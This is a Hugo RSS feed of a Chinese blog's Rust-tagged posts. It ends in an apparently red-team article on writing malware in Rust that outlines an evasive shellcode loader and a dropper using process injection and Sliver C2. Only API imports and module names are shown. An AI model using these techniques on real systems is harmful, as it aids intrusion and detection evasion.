<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Rust on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/rust/</link>
        <description>Recent content in Rust on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Sat, 09 Aug 2025 02:14:56 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/rust/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>为什么你的下一个项目应该使用Rust编程语言的7个理由</title>
        <link>http://localhost:1313/p/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E5%BA%94%E8%AF%A5%E4%BD%BF%E7%94%A8rust%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%9A%847%E4%B8%AA%E7%90%86%E7%94%B1/</link>
        <pubDate>Sat, 09 Aug 2025 02:14:56 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E5%BA%94%E8%AF%A5%E4%BD%BF%E7%94%A8rust%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%9A%847%E4%B8%AA%E7%90%86%E7%94%B1/</guid>
        <description>&lt;h2 id=&#34;rust编程语言是什么&#34;&gt;Rust编程语言是什么？
&lt;/h2&gt;&lt;p&gt;就像它名字来源的真菌一样，Rust编程语言正在开发领域快速蔓延。本质上，Rust是为克服C++缺陷而设计的语言。虽然C++是功能强大的面向对象语言，但手动内存管理对开发者而言极为困难。Rust让你能编写内存占用极低的高效代码，成为强大的开发工具。&lt;/p&gt;
&lt;p&gt;Mozilla于2012年推出Rust，但其构想源自语言工程师Graydon Hoare。他在2006年开始开发这门语言，其潜力很快引起Mozilla的注意。正如Hoare所说：&amp;ldquo;这门语言的目标用户是受挫的C++开发者&amp;rdquo;。&lt;/p&gt;
&lt;h2 id=&#34;rust的优势特性&#34;&gt;Rust的优势特性
&lt;/h2&gt;&lt;h3 id=&#34;1-解决内存管理难题&#34;&gt;1. 解决内存管理难题
&lt;/h3&gt;&lt;p&gt;系统编程通常需要底层内存控制，而C语言的手动内存管理如同噩梦。Rust通过直接访问硬件和内存（无需垃圾回收器持续运行），实现了类似微控制器的低层编码体验，可自由替换代码片段而不必担心内存安全问题。&lt;/p&gt;
&lt;h3 id=&#34;2-嵌入式编程的理想选择&#34;&gt;2. 嵌入式编程的理想选择
&lt;/h3&gt;&lt;p&gt;嵌入式系统通常资源受限，Rust凭借极低开销成为完美选择。其&amp;quot;零成本抽象&amp;quot;特性允许使用循环、闭包等各种代码风格，最终都会编译为相同的汇编指令而不影响性能。&lt;/p&gt;
&lt;h3 id=&#34;3-强大的web应用开发能力&#34;&gt;3. 强大的Web应用开发能力
&lt;/h3&gt;&lt;p&gt;通过编译为WebAssembly，Rust能在网页上实现接近原生的性能。任何语言都可以通过Rust编译为WebAssembly，实现在线可移植的代码执行。&lt;/p&gt;
&lt;h3 id=&#34;4-静态类型确保可维护性&#34;&gt;4. 静态类型确保可维护性
&lt;/h3&gt;&lt;p&gt;作为静态强类型语言，Rust在编译时已知所有类型，大幅降低了编写错误程序的可能性。随着代码增长，静态类型帮助管理复杂度，且无需重复声明变量类型。&lt;/p&gt;
&lt;h3 id=&#34;5-媲美c的高性能&#34;&gt;5. 媲美C++的高性能
&lt;/h3&gt;&lt;p&gt;没有垃圾回收机制使得Rust速度极快。编译器直接在编译阶段拦截错误代码，防止其扩散造成系统问题。在嵌入式系统上，Rust同样表现优异。&lt;/p&gt;
&lt;h3 id=&#34;6-跨平台开发支持&#34;&gt;6. 跨平台开发支持
&lt;/h3&gt;&lt;p&gt;Rust可轻松构建跨Linux、macOS、Windows等平台的解决方案。工具链如Rustup（快速安装工具）、Rustfmt（代码格式化）和Clippy（代码风格检查）使开发更加便捷。&lt;/p&gt;
&lt;h3 id=&#34;7-不断扩展的生态系统&#34;&gt;7. 不断扩展的生态系统
&lt;/h3&gt;&lt;p&gt;Cargo作为Rust的包管理工具，能处理依赖、运行测试和生成文档。社区网站crates.io提供丰富的库资源，docs.rs则提供完善的文档支持。此外还有众多开发者会议如RustConf分享最新知识。&lt;/p&gt;
&lt;h2 id=&#34;rust与其他语言的对比&#34;&gt;Rust与其他语言的对比
&lt;/h2&gt;&lt;h3 id=&#34;rust-vs-go&#34;&gt;Rust vs Go
&lt;/h3&gt;&lt;p&gt;Go适合微服务、CLI和流处理开发，云原生应用表现优异；而Rust更通用，既能开发嵌入式系统，也支持WebAssembly网页开发。两者都是编译型语言，性能出色。Go更简单易用，Rust则更适合性能至上的解决方案。&lt;/p&gt;
&lt;h3 id=&#34;rust-vs-c&#34;&gt;Rust vs C++
&lt;/h3&gt;&lt;p&gt;C++发布于1985年，是历史悠久的通用语言。Rust借鉴了C++许多特性，但内存管理方式完全不同。性能上C++略胜一筹，但Rust社区正通过LLVM优化持续改进。学习曲线方面，两者都需要投入较长时间。&lt;/p&gt;
&lt;h2 id=&#34;rust的六大应用场景&#34;&gt;Rust的六大应用场景
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;物联网开发&lt;/strong&gt;：适合Raspberry Pi等内存有限的设备&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高性能计算&lt;/strong&gt;：通过FFI接口可无开销执行Rust代码&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;WebAssembly网页应用&lt;/strong&gt;：与JavaScript完美配合&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;科研项目&lt;/strong&gt;：科学家已从Python转向Rust处理海量计算&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;游戏开发&lt;/strong&gt;：拥有Amethyst、bevy等多个游戏引擎&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;区块链开发&lt;/strong&gt;：内存安全特性完美契合区块链需求&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;谁在使用rust&#34;&gt;谁在使用Rust？
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Coursera&lt;/strong&gt;：用于学生编程作业的安全执行环境&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Dropbox&lt;/strong&gt;：文件同步引擎的核心组件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;npm&lt;/strong&gt;：重写主服务提升性能&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;微软&lt;/strong&gt;：尝试用Rust解决70%的内存安全漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Discord&lt;/strong&gt;：服务端和客户端同时采用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Facebook&lt;/strong&gt;：重写版本控制系统后端&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;rust的局限性&#34;&gt;Rust的局限性
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;编译时错误多且编译速度慢&lt;/li&gt;
&lt;li&gt;缺乏成熟库生态系统&lt;/li&gt;
&lt;li&gt;不适合快速原型开发&lt;/li&gt;
&lt;li&gt;学习曲线陡峭&lt;/li&gt;
&lt;li&gt;市场份额仍在成长中&lt;/li&gt;
&lt;li&gt;平台支持范围有限&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;学习建议&#34;&gt;学习建议
&lt;/h2&gt;&lt;p&gt;官方推荐从&lt;a class=&#34;link&#34; href=&#34;https://learnrust.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Rust学习网站&lt;/a&gt;开始，通过《Rust编程语言》书籍和Rustlings小练习入门。对于已有Python基础的开发者，可以逐步过渡到Rust学习更高级的概念。根据目标选择语言：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;科研/数据科学/Web开发：Python&lt;/li&gt;
&lt;li&gt;系统/区块链/WebAssembly：Rust&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Rust代表着编程语言的未来方向，其内存安全、高性能和现代特性，加上活跃的开发者社区，使其成为值得投资学习的新兴技术。无论你是系统程序员、Web开发者还是物联网专家，Rust都能为你的工具箱增添强大武器。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Siderophile：暴露Rust代码库中的不安全操作</title>
        <link>http://localhost:1313/p/siderophile%E6%9A%B4%E9%9C%B2rust%E4%BB%A3%E7%A0%81%E5%BA%93%E4%B8%AD%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%93%8D%E4%BD%9C/</link>
        <pubDate>Wed, 06 Aug 2025 08:22:18 +0800</pubDate>
        
        <guid>http://localhost:1313/p/siderophile%E6%9A%B4%E9%9C%B2rust%E4%BB%A3%E7%A0%81%E5%BA%93%E4%B8%AD%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%93%8D%E4%BD%9C/</guid>
        <description>&lt;p&gt;今天我们发布了一款名为siderophile的工具，它能帮助Rust开发者在代码库中寻找模糊测试目标。该工具会扫描crate的所有依赖项，定位每个不安全函数、表达式、特质方法等，然后沿调用图追溯至使用这些不安全元素的源头函数，并按危险程度（badness）进行排序——函数使用的不安全元素越多，其危险等级就越高。&lt;/p&gt;
&lt;p&gt;Siderophile（[ˈsidərəˌfīl]）——对金属铁有亲和力&lt;/p&gt;
&lt;p&gt;我们在一次紧急代码审计任务中开发了这个工具。当时需要短时间内审查一个庞大的Rust代码库，通过siderophile自动化定位高风险函数，显著加速了漏洞发现过程。现在我们将这个工具开源。&lt;/p&gt;
&lt;h3 id=&#34;示例输出&#34;&gt;示例输出
&lt;/h3&gt;&lt;p&gt;在MLS加密协议实现库molasses上运行的示例结果：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;危险度&lt;/th&gt;
          &lt;th&gt;函数&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;012&lt;/td&gt;
          &lt;td&gt;molasses::crypto::hash::HashFunction::hash_serializable&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;005&lt;/td&gt;
          &lt;td&gt;molasses::crypto::hash::HashContext::feed_serializable&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;003&lt;/td&gt;
          &lt;td&gt;molasses::utils::derive_node_values&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;hellip;&lt;/td&gt;
          &lt;td&gt;&amp;hellip;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;可见主要风险集中在序列化和加密相关例程中，这些将是1.0版本前的重点模糊测试对象。&lt;/p&gt;
&lt;h3 id=&#34;局限性&#34;&gt;局限性
&lt;/h3&gt;&lt;p&gt;当前版本无法检测宏和动态分发方法中的不安全操作，且在某些crate上存在误报。我们正在积极维护项目，欢迎贡献者参与改进。&lt;/p&gt;
&lt;h3 id=&#34;立即试用&#34;&gt;立即试用
&lt;/h3&gt;&lt;p&gt;Siderophile已发布在GitHub，包含详细使用说明。建议对您的Rust crate运行该工具，并针对发现的高风险函数设置模糊测试。&lt;/p&gt;
&lt;p&gt;最后感谢cargo-geiger和rust-praezi项目的先驱工作。本工具很大程度上基于他们的成果。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Trail of Bits 2022开源贡献亮点回顾：从Rust优化到区块链安全</title>
        <link>http://localhost:1313/p/trail-of-bits-2022%E5%BC%80%E6%BA%90%E8%B4%A1%E7%8C%AE%E4%BA%AE%E7%82%B9%E5%9B%9E%E9%A1%BE%E4%BB%8Erust%E4%BC%98%E5%8C%96%E5%88%B0%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/</link>
        <pubDate>Sun, 03 Aug 2025 16:50:16 +0800</pubDate>
        
        <guid>http://localhost:1313/p/trail-of-bits-2022%E5%BC%80%E6%BA%90%E8%B4%A1%E7%8C%AE%E4%BA%AE%E7%82%B9%E5%9B%9E%E9%A1%BE%E4%BB%8Erust%E4%BC%98%E5%8C%96%E5%88%B0%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/</guid>
        <description>&lt;h3 id=&#34;开源协作的技术价值&#34;&gt;开源协作的技术价值
&lt;/h3&gt;&lt;p&gt;去年此时，我们曾汇报2021年向非Trail of Bits仓库提交的190+个合并PR。2022年，这一数字突破400！这种持续投入源于我们对生态互惠的深刻理解：虽然我们为自己的工具感到自豪，但同样受益于社区维护的项目。当遇到工具不符合预期时，我们选择修复它；当功能存在缺口时，我们主动完善它。&lt;/p&gt;
&lt;h3 id=&#34;关键技术贡献精选&#34;&gt;关键技术贡献精选
&lt;/h3&gt;&lt;h4 id=&#34;rust工具链增强&#34;&gt;Rust工具链增强
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Clippy&lt;/strong&gt;：新增&lt;code&gt;crate_in_macro_def&lt;/code&gt;和&lt;code&gt;unnecessary_find_map&lt;/code&gt; lint规则，优化了包括&lt;code&gt;empty_line_after_outer_attribute&lt;/code&gt;、&lt;code&gt;expect_used/unwrap_used&lt;/code&gt;等在内的12项现有lint检查逻辑，显著提升Rust代码质量分析能力。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;区块链基础设施&#34;&gt;区块链基础设施
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;HEVM&lt;/strong&gt;：改进了以太坊虚拟机的符号执行引擎，包括SMT求解器使用简化、性能优化、内存泄漏修复及测试套件增强。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Solana&lt;/strong&gt;：为rbpf添加了JIT编译器对Windows平台的完整支持（#359），扩展了智能合约运行环境兼容性。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;网络协议栈重构&#34;&gt;网络协议栈重构
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Envoy&lt;/strong&gt;：设计实现了统一头部验证组件(UHV)，将HTTP/1和HTTP/2的请求响应头验证逻辑集中化，通过RFC合规性审计修复了多处安全边界问题，为防御新型头部注入攻击提供标准化入口点。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;密码学工程改进&#34;&gt;密码学工程改进
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;pyca/cryptography&lt;/strong&gt;：增强证书透明度支持，新增&lt;code&gt;load_pem_x509_certificates&lt;/code&gt;等5个关键API，改进Python加密原语可用性。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;go-cose&lt;/strong&gt;：完成了全面的安全审计报告上传（#94），为COSE标准实现提供安全保障。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;系统安全加固&#34;&gt;系统安全加固
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;osquery&lt;/strong&gt;：修复了BPF事件处理、YARA内存泄漏等23项安全问题，新增Windows安全启动信息采集功能（#7692），并完成OpenSSL从1.1.1l到1.1.1q的迭代更新。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;质量构建方法论&#34;&gt;质量构建方法论
&lt;/h3&gt;&lt;p&gt;这些高质量软件的实现不仅依赖PR合并，更需要：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;精准的需求规划&lt;/li&gt;
&lt;li&gt;生态位理解&lt;/li&gt;
&lt;li&gt;相关项目的深度认知&lt;/li&gt;
&lt;li&gt;在软件供应链中的角色定位&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们向所有维护者致敬——无论是可见的代码贡献，还是无数不可见的幕后工作。&lt;/p&gt;
&lt;p&gt;（完整PR列表包含400+项技术改进，涉及AFLplusplus模糊测试框架、Z3定理证明器、CPython解释器等关键项目）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Rust在恶意软件开发中的优势与实践</title>
        <link>http://localhost:1313/p/rust%E5%9C%A8%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BC%98%E5%8A%BF%E4%B8%8E%E5%AE%9E%E8%B7%B5/</link>
        <pubDate>Sat, 02 Aug 2025 21:49:26 +0800</pubDate>
        
        <guid>http://localhost:1313/p/rust%E5%9C%A8%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BC%98%E5%8A%BF%E4%B8%8E%E5%AE%9E%E8%B7%B5/</guid>
        <description>&lt;h1 id=&#34;rust在恶意软件开发中的应用&#34;&gt;Rust在恶意软件开发中的应用
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;作者分享了学习Rust进行恶意软件开发的经历，旨在提升模拟真实攻击的能力。Rust因其固有的反分析特性成为首选语言，能开发更具隐蔽性的工具。&lt;/p&gt;
&lt;h2 id=&#34;rust与c语言的对比分析&#34;&gt;Rust与C语言的对比分析
&lt;/h2&gt;&lt;p&gt;近年来，Go、Nim和Rust等语言在恶意软件作者中日益流行，主要基于两个假设：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;这些语言编译的二进制文件比C/C++更难逆向分析&lt;/li&gt;
&lt;li&gt;非常规语言开发的恶意软件更容易绕过基于签名的检测机制&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;2023年罗切斯特理工学院的一项研究证实：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Rust二进制文件显著大于C/C++版本&lt;/li&gt;
&lt;li&gt;自动化分析工具对Rust程序产生更多误报和漏报&lt;/li&gt;
&lt;li&gt;Ghidra和IDA Free等工具对Rust二进制文件的反编译效果较差&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;实例分析shellcode加载器&#34;&gt;实例分析：Shellcode加载器
&lt;/h2&gt;&lt;p&gt;通过功能相同的Rust和C版shellcode加载器进行对比：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;fs&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;File&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;ptr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windows&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;Win32&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Threading&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateThread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WaitForSingleObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;THREAD_CREATION_FLAGS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;INFINITE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Memory&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualProtect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;MEM_COMMIT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;MEM_RESERVE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;PAGE_READWRITE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;PAGE_PROTECTION_FLAGS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Foundation&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;CloseHandle&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;编译后，Rust程序(151.5KB)几乎是C程序(71.7KB)的两倍，这是因为Rust默认静态链接依赖项。&lt;/p&gt;
&lt;h2 id=&#34;ghidra逆向分析对比&#34;&gt;Ghidra逆向分析对比
&lt;/h2&gt;&lt;p&gt;Rust程序的反编译输出难以理解，原因包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Ghidra尝试将Rust反编译为伪C代码，但内存管理和优化差异导致难以理解&lt;/li&gt;
&lt;li&gt;rustc的编译优化导致函数边界模糊，汇编代码高度优化&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;相比之下，C程序的反编译输出与源代码高度一致。&lt;/p&gt;
&lt;h2 id=&#34;开发rust恶意软件投放器&#34;&gt;开发Rust恶意软件投放器
&lt;/h2&gt;&lt;p&gt;构建一个投放器演示，功能包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;枚举目标进程以注入payload&lt;/li&gt;
&lt;li&gt;使用文件映射注入技术执行payload&lt;/li&gt;
&lt;li&gt;通过HTTPS部署Sliver C2框架&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;关键代码模块：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;mod&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;enumerate_processes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;mod&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;remote_mapping_injection&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
